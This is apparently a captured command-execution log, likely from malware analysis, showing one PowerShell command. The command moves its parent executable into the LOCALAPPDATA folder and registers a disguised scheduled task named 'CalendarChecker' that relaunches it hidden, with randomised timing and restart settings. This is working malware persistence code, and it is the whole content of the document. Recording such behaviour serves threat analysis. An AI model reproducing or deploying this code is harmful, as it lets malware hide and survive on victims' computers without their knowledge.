command_executions:
"powershell.exe" -Command "
    $random = New-Object System.Random;
    $interval = $random.Next(1, 4);
    $sys_min = [int](Get-Date -format \"mm\") + (60 / $interval);
    $sys_sec = [int](Get-Date -format \"ss\") + (60 / $interval);
    $envir = $env:LOCALAPPDATA;
    $spica = (Get-Process -Id (Get-WmiObject Win32_Process -Filter \"ProcessId=$PID\").ParentProcessId).ProcessName.Replace(\"\r\n\",\"\") + \".exe\";
    $file_path = (Get-Command -Name \"./$spica\").Source;
    Move-Item -Path $file_path -Destination $envir -Force;
    $action = New-ScheduledTaskAction -Execute ($envir + \"\$spica\") -Argument \"-WindowStyle Hidden\";
    $settings = New-ScheduledTaskSettingsSet -DeleteExpiredTaskAfter (New-TimeSpan -Seconds 30) -ExecutionTimeLimit (New-TimeSpan -Hours 3) -RestartCount:3 -RestartInterval (New-TimeSpan -Minutes 10);
    $settings.StartWhenAvailable = $true;
    $description = \"Calendar\";
    $taskName = \"CalendarChecker\";
    $settings.DisallowStartIfOnBatteries = $false;
    $settings.StopIfGoingOnBatteries = $false;
    $trigger = New-ScheduledTaskTrigger -Daily -At (Get-Date).addSeconds(10);
    $trigger.StartBoundary = (Get-Date).AddHours($interval).addMinutes($sys_min).addSeconds($sys_sec).ToString(\"s\");
    $trigger.EndBoundary = (Get-Date).AddDays(2).ToString(\"s\");
    Register-ScheduledTask -TaskName $taskName -Description $description -Action $action -Settings $settings -Trigger $trigger;
    "

